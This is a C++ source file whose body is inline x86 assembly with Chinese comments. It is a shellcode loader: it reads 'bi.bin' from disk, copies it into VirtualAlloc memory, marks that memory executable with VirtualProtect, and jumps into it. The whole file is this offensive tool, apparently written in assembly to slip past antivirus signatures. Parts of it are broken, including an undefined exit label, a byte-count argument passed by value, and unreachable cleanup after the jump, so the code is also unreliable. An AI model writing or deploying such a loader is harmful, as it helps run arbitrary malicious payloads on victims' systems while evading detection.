#include <Windows.h>
#include <iostream>
int main()
{
    HANDLE hFile;
    LPCSTR FileName= "bi.bin"; //被加载的shellcode Bin文件
    DWORD dwFileSize;
    LPVOID lpFileContent;
    DWORD dwOldProtect;
    PDWORD dwOldProtectPDWD;
    DWORD dwBytesRead = 0;
    BOOL bResult;
    LPDWORD dwBytesReadLPD;
    __asm {
        mov     eax,FileName
        push    NULL
        push    FILE_ATTRIBUTE_NORMAL
        push    OPEN_EXISTING
        push    NULL
        push    FILE_SHARE_READ
        push    GENERIC_READ
        push    eax
        call    CreateFile
        mov     hFile,eax
        mov     eax,hFile
        push    NULL
        push    eax
        call    GetFileSize
        mov     dwFileSize,eax
        mov     eax, dwFileSize //将dwFileSize的数字塞入eax寄存器
        push    PAGE_READWRITE  //将PAGE_READWRITE压入栈中
        push    MEM_COMMIT      //将MEM_COMMIT压入栈中
        push    eax             //将存放dwFileSize的寄存器中的值压入栈中
        push    NULL            //就这样
        call    VirtualAlloc    //通知函数收尸
        mov     lpFileContent,eax //返回
        mov     eax,dwBytesRead
        mov     dwBytesReadLPD,eax
        mov     eax,dwBytesReadLPD
        push    NULL
        mov     eax,dwBytesReadLPD
        push    eax
        mov     eax,dwFileSize
        push    eax
        mov     eax,lpFileContent
        push    eax
        mov     eax,hFile
        push    eax
        call    ReadFile
        mov     bResult,eax
        mov     eax, hFile
        push    eax
        call    CloseHandle
        mov     eax,dwOldProtect
        mov     dwOldProtectPDWD, eax
        mov     eax, dwOldProtectPDWD
        push    eax
        push    PAGE_EXECUTE_READ
        mov     eax, dwFileSize
        push    eax
        mov     eax, lpFileContent
        push    eax
        call    VirtualProtect
        mov     eax, lpFileContent
        jmp     eax
        push    MEM_RELEASE
        push    0
        push    eax
        call    VirtualFree
        mov     eax,0
        jmp     exit
    }
}
